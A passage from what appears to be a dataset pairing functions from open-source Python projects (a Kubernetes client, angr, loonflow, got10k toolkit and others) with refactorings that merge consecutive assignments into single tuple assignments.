        if 'allow_watch_bookmarks' in local_var_params and local_var_params['allow_watch_bookmarks'] is not None:  # noqa: E501
            query_params.append(('allowWatchBookmarks', local_var_params['allow_watch_bookmarks']))  # noqa: E501
        if '_continue' in local_var_params and local_var_params['_continue'] is not None:  # noqa: E501
            query_params.append(('continue', local_var_params['_continue']))  # noqa: E501
        if 'field_selector' in local_var_params and local_var_params['field_selector'] is not None:  # noqa: E501
            query_params.append(('fieldSelector', local_var_params['field_selector']))  # noqa: E501
        if 'label_selector' in local_var_params and local_var_params['label_selector'] is not None:  # noqa: E501
            query_params.append(('labelSelector', local_var_params['label_selector']))  # noqa: E501
        if 'limit' in local_var_params and local_var_params['limit'] is not None:  # noqa: E501
            query_params.append(('limit', local_var_params['limit']))  # noqa: E501
        if 'resource_version' in local_var_params and local_var_params['resource_version'] is not None:  # noqa: E501
            query_params.append(('resourceVersion', local_var_params['resource_version']))  # noqa: E501
        if 'resource_version_match' in local_var_params and local_var_params['resource_version_match'] is not None:  # noqa: E501
            query_params.append(('resourceVersionMatch', local_var_params['resource_version_match']))  # noqa: E501
        if 'timeout_seconds' in local_var_params and local_var_params['timeout_seconds'] is not None:  # noqa: E501
            query_params.append(('timeoutSeconds', local_var_params['timeout_seconds']))  # noqa: E501
        if 'watch' in local_var_params and local_var_params['watch'] is not None:  # noqa: E501
            query_params.append(('watch', local_var_params['watch']))  # noqa: E501

        header_params = {}

        form_params = []
        local_var_files = {}

        body_params = None
        # HTTP header `Accept`
        header_params['Accept'] = self.api_client.select_header_accept(
            ['application/json', 'application/yaml', 'application/vnd.kubernetes.protobuf', 'application/json;stream=watch', 'application/vnd.kubernetes.protobuf;stream=watch'])  # noqa: E501

        # Authentication setting
        auth_settings = ['BearerToken']  # noqa: E501

        return self.api_client.call_api(
            '/api/v1/namespaces/{namespace}/secrets', 'GET',
            path_params,
            query_params,
            header_params,
            body=body_params,
            post_params=form_params,
            files=local_var_files,
            response_type='V1SecretList',  # noqa: E501
            auth_settings=auth_settings,
            async_req=local_var_params.get('async_req'),
            _return_http_data_only=local_var_params.get('_return_http_data_only'),  # noqa: E501
            _preload_content=local_var_params.get('_preload_content', True),
            _request_timeout=local_var_params.get('_request_timeout'),
            collection_formats=collection_formats)","form_params = []
local_var_files = {}
body_params = None
header_params['Accept'] = self.api_client.select_header_accept(['application/json', 'application/yaml', 'application/vnd.kubernetes.protobuf', 'application/json;stream=watch', 'application/vnd.kubernetes.protobuf;stream=watch'])
auth_settings = ['BearerToken']","form_params , local_var_files , body_params , header_params['Accept'] , auth_settings  = [], {}, None, self.api_client.select_header_accept(['application/json', 'application/yaml', 'application/vnd.kubernetes.protobuf', 'application/json;stream=watch', 'application/vnd.kubernetes.protobuf;stream=watch']), ['BearerToken']"
angr,https://github.com/angr/angr/tree/master/angr/state_plugins/solver.py,,timed_function$23,"def timed_function(f):
    if _timing_enabled:
        @functools.wraps(f)
        def timing_guy(*args, **kwargs):
            the_solver = kwargs.pop('the_solver', None)
            the_solver = args[0] if the_solver is None else the_solver
            s = the_solver.state

            start = time.time()
            r = f(*args, **kwargs)
            end = time.time()
            duration = end-start

            try:
                if s.scratch.sim_procedure is None and s.scratch.bbl_addr is not None:
                    location = ""bbl %#x, stmt %s (inst %s)"" % (
                        s.scratch.bbl_addr,
                        s.scratch.stmt_idx,
                        ('%s' % s.scratch.ins_addr if s.scratch.ins_addr is None else '%#x' % s.scratch.ins_addr)
                    )
                elif s.scratch.sim_procedure is not None:
                    location = ""sim_procedure %s"" % s.scratch.sim_procedure
                else:
                    location = ""unknown""
            except Exception: #pylint:disable=broad-except
                l.error(""Got exception while generating timer message:"", exc_info=True)
                location = ""unknown""
            lt.log(int((end-start)*10), '%s took %s seconds at %s', f.__name__, round(duration, 2), location)

            if 0 <= break_time < duration:
                #pylint: disable = import-outside-toplevel
                import ipdb; ipdb.set_trace()

            return r

        return timing_guy
    else:
        return f","s = the_solver.state
start = time.time()
r = f(*args, **kwargs)
end = time.time()","s , start , r , end  = the_solver.state, time.time(), f(*args, **kwargs), time.time()"
loonflow,https://github.com/blackholll/loonflow/tree/master/service/account/account_base_service.py,AccountBaseService,get_user_role_info_by_user_id$103,"def get_user_role_info_by_user_id(cls, user_id: int, search_value: str=0, page: int =1, per_page: int=10)->tuple:
        """"""
        get user's role info list by user's id and query params: role name、page、per_page
        :param user_id:
        :param search_value:
        :param page:
        :param per_page:
        :return:
        """"""
        user_role_queryset = LoonUserRole.objects.filter(user_id=user_id, is_deleted=0).all()
        user_role_id_list = [user_role.role_id for user_role in user_role_queryset]
        query_params = Q(is_deleted=False, id__in=user_role_id_list)
        if search_value:
            query_params &= Q(name__contains=search_value)
        role_info_queryset = LoonRole.objects.filter(query_params).all()
        paginator = Paginator(role_info_queryset, per_page)
        try:
            role_info_result_paginator = paginator.page(page)
        except PageNotAnInteger:
            role_info_result_paginator = paginator.page(1)
        except EmptyPage:
            # If page is out of range (e.g. 9999), deliver last page of results
            role_info_result_paginator = paginator.page(paginator.num_pages)
        role_result_list = role_info_result_paginator.object_list
        role_result_format_list = []
        for role_info in role_result_list:
            role_result_format_list.append(dict(id=role_info.id, name=role_info.name, description=role_info.description,
                                                label=json.dumps(role_info.label) if role_info.label else {},
                                                creator=role_info.creator, gmt_created=str(role_info.gmt_created)[:19]))
        return True, dict(role_result_format_list=role_result_format_list,
                          paginator_info=dict(per_page=per_page, page=page, total=paginator.count))","role_result_list = role_info_result_paginator.object_list
role_result_format_list = []","role_result_list , role_result_format_list  = role_info_result_paginator.object_list, []"
Texygen,https://github.com/geek-ai/Texygen/tree/master/models/rankgan/RankganGenerator.py,Generator,create_recurrent_unit$138,"def create_recurrent_unit(self, params):
        # Weights and Bias for input and hidden tensor
        self.Wi = tf.Variable(self.init_matrix([self.emb_dim, self.hidden_dim]))
        self.Ui = tf.Variable(self.init_matrix([self.hidden_dim, self.hidden_dim]))
        self.bi = tf.Variable(self.init_matrix([self.hidden_dim]))

        self.Wf = tf.Variable(self.init_matrix([self.emb_dim, self.hidden_dim]))
        self.Uf = tf.Variable(self.init_matrix([self.hidden_dim, self.hidden_dim]))
        self.bf = tf.Variable(self.init_matrix([self.hidden_dim]))

        self.Wog = tf.Variable(self.init_matrix([self.emb_dim, self.hidden_dim]))
        self.Uog = tf.Variable(self.init_matrix([self.hidden_dim, self.hidden_dim]))
        self.bog = tf.Variable(self.init_matrix([self.hidden_dim]))

        self.Wc = tf.Variable(self.init_matrix([self.emb_dim, self.hidden_dim]))
        self.Uc = tf.Variable(self.init_matrix([self.hidden_dim, self.hidden_dim]))
        self.bc = tf.Variable(self.init_matrix([self.hidden_dim]))
        params.extend([
            self.Wi, self.Ui, self.bi,
            self.Wf, self.Uf, self.bf,
            self.Wog, self.Uog, self.bog,
            self.Wc, self.Uc, self.bc])

        def unit(x, hidden_memory_tm1):
            previous_hidden_state, c_prev = tf.unstack(hidden_memory_tm1)

            # Input Gate
            i = tf.sigmoid(
                tf.matmul(x, self.Wi) +
                tf.matmul(previous_hidden_state, self.Ui) + self.bi
            )

            # Forget Gate
            f = tf.sigmoid(
                tf.matmul(x, self.Wf) +
                tf.matmul(previous_hidden_state, self.Uf) + self.bf
            )

            # Output Gate
            o = tf.sigmoid(
                tf.matmul(x, self.Wog) +
                tf.matmul(previous_hidden_state, self.Uog) + self.bog
            )

            # New Memory Cell
            c_ = tf.nn.tanh(
                tf.matmul(x, self.Wc) +
                tf.matmul(previous_hidden_state, self.Uc) + self.bc
            )

            # Final Memory cell
            c = f * c_prev + i * c_

            # Current Hidden state
            current_hidden_state = o * tf.nn.tanh(c)

            return tf.stack([current_hidden_state, c])

        return unit","i = tf.sigmoid(tf.matmul(x, self.Wi) + tf.matmul(previous_hidden_state, self.Ui) + self.bi)
f = tf.sigmoid(tf.matmul(x, self.Wf) + tf.matmul(previous_hidden_state, self.Uf) + self.bf)
o = tf.sigmoid(tf.matmul(x, self.Wog) + tf.matmul(previous_hidden_state, self.Uog) + self.bog)
c_ = tf.nn.tanh(tf.matmul(x, self.Wc) + tf.matmul(previous_hidden_state, self.Uc) + self.bc)","i , f , o , c_  = tf.sigmoid(tf.matmul(x, self.Wi) + tf.matmul(previous_hidden_state, self.Ui) + self.bi), tf.sigmoid(tf.matmul(x, self.Wf) + tf.matmul(previous_hidden_state, self.Uf) + self.bf), tf.sigmoid(tf.matmul(x, self.Wog) + tf.matmul(previous_hidden_state, self.Uog) + self.bog), tf.nn.tanh(tf.matmul(x, self.Wc) + tf.matmul(previous_hidden_state, self.Uc) + self.bc)"
XwareDesktop,https://github.com/Xinkai/XwareDesktop/tree/master/src/frontend/libxware/vanilla.py,XwareClient,__init__$24,"def __init__(self):
        self._options = {
            ""timeout"": 1,
            ""ua"": ""libxware/0.1"",
        }
        self._connector = aiohttp.TCPConnector(share_cookies = True)","self._options = {'timeout': 1, 'ua': 'libxware/0.1'}
self._connector = aiohttp.TCPConnector(share_cookies=True)","self._options , self._connector  = {'timeout': 1, 'ua': 'libxware/0.1'}, aiohttp.TCPConnector(share_cookies=True)"
hamster,https://github.com/projecthamster/hamster/tree/master/waflib/Tools/msvc.py,,gather_vswhere_versions$448,"def gather_vswhere_versions(conf, versions):
	try:
		import json
	except ImportError:
		Logs.error('Visual Studio 2017 detection requires Python 2.6')
		return

	prg_path = os.environ.get('ProgramFiles(x86)', os.environ.get('ProgramFiles', 'C:\\Program Files (x86)'))

	vswhere = os.path.join(prg_path, 'Microsoft Visual Studio', 'Installer', 'vswhere.exe')
	args = [vswhere, '-products', '*', '-legacy', '-format', 'json']
	try:
		txt = conf.cmd_and_log(args)
	except Errors.WafError as e:
		Logs.debug('msvc: vswhere.exe failed %s', e)
		return

	if sys.version_info[0] < 3:
		txt = txt.decode(Utils.console_encoding())

	arr = json.loads(txt)
	arr.sort(key=lambda x: x['installationVersion'])
	for entry in arr:
		ver = entry['installationVersion']
		ver = str('.'.join(ver.split('.')[:2]))
		path = str(os.path.abspath(entry['installationPath']))
		if os.path.exists(path) and ('msvc %s' % ver) not in versions:
			conf.gather_msvc_targets(versions, ver, path)","ver = str('.'.join(ver.split('.')[:2]))
path = str(os.path.abspath(entry['installationPath']))","ver , path  = str('.'.join(ver.split('.')[:2])), str(os.path.abspath(entry['installationPath']))"
thriftpy2,https://github.com/Thriftpy/thriftpy2/tree/master/thriftpy2/tornado.py,TTornadoServer,handle_stream$186,"def handle_stream(self, stream, address):
        host, port = address
        trans = TTornadoStreamTransport(
            host=host, port=port, stream=stream,
            io_loop=self.__io_loop, read_timeout=self.transport_read_timeout)
        try:
            oprot = self._oprot_factory.get_protocol(trans)
            iprot = self._iprot_factory.get_protocol(TMemoryBuffer())

            while not trans.stream.closed():
                # TODO: maybe read multiple frames in advance for concurrency
                try:
                    frame = yield trans.read_frame()
                except TTransportException as e:
                    if e.type == TTransportException.END_OF_FILE:
                        break
                    else:
                        raise

                iprot.trans.setvalue(frame)
                api, seqid, result, call = self._processor.process_in(iprot)
                if isinstance(result, TApplicationException):
                    self._processor.send_exception(oprot, api, result, seqid)
                else:
                    try:
                        result.success = yield gen.maybe_future(call())
                    except Exception as e:
                        # raise if api don't have throws
                        if not self._processor.handle_exception(e, result):
                            raise

                    self._processor.send_result(oprot, api, result, seqid)
        except Exception:
            logger.exception('thrift exception in handle_stream')
            trans.close()

        logger.info('client disconnected %s:%d', host, port)","oprot = self._oprot_factory.get_protocol(trans)
iprot = self._iprot_factory.get_protocol(TMemoryBuffer())","oprot , iprot  = self._oprot_factory.get_protocol(trans), self._iprot_factory.get_protocol(TMemoryBuffer())"
toapi,https://github.com/gaojiuli/toapi/tree/master/toapi/item.py,ItemType,__new__$7,"def __new__(cls, what, bases=None, attrdict=None):
        __fields__ = OrderedDict()

        for name, selector in attrdict.items():
            if isinstance(selector, Selector):
                __fields__[name] = selector

        for name in __fields__.keys():
            del attrdict[name]

        instance = type.__new__(cls, what, bases, attrdict)
        instance._list = None
        instance._site = None
        instance._selector = None
        instance.__fields__ = __fields__
        return instance","instance._list = None
instance._site = None
instance._selector = None
instance.__fields__ = __fields__","instance._list , instance._site , instance._selector , instance.__fields__  = None, None, None, __fields__"
poetry,https://github.com/sheepzh/poetry/tree/master//get-poetry.py,Installer,_compare_versions$417,"def _compare_versions(x, y):
            mx = self.VERSION_REGEX.match(x)
            my = self.VERSION_REGEX.match(y)

            vx = tuple(int(p) for p in mx.groups()[:3]) + (mx.group(5),)
            vy = tuple(int(p) for p in my.groups()[:3]) + (my.group(5),)

            if vx < vy:
                return -1
            elif vx > vy:
                return 1

            return 0","vx = tuple((int(p) for p in mx.groups()[:3])) + (mx.group(5),)
vy = tuple((int(p) for p in my.groups()[:3])) + (my.group(5),)","vx , vy  = tuple((int(p) for p in mx.groups()[:3])) + (mx.group(5),), tuple((int(p) for p in my.groups()[:3])) + (my.group(5),)"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","succ_file = os.path.join(report_dir, 'success_plots' + extension)
prec_file = os.path.join(report_dir, 'precision_plots' + extension)
norm_prec_file = os.path.join(report_dir, 'norm_precision_plots' + extension)
key = 'overall'
markers = ['-', '--', '-.']","succ_file , prec_file , norm_prec_file , key , markers  = os.path.join(report_dir, 'success_plots' + extension), os.path.join(report_dir, 'precision_plots' + extension), os.path.join(report_dir, 'norm_precision_plots' + extension), 'overall', ['-', '--', '-.']"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","markers = [c + m for m in markers for c in [''] * 10]
performance = {k: v for (k, v) in performance.items() if k in tracker_names}","markers , performance  = [c + m for m in markers for c in [''] * 10], {k: v for (k, v) in performance.items() if k in tracker_names}"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","tracker_names = [tracker_names[i] for i in inds]
thr_iou = np.linspace(0, 1, self.nbins_iou)","tracker_names , thr_iou  = [tracker_names[i] for i in inds], np.linspace(0, 1, self.nbins_iou)"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
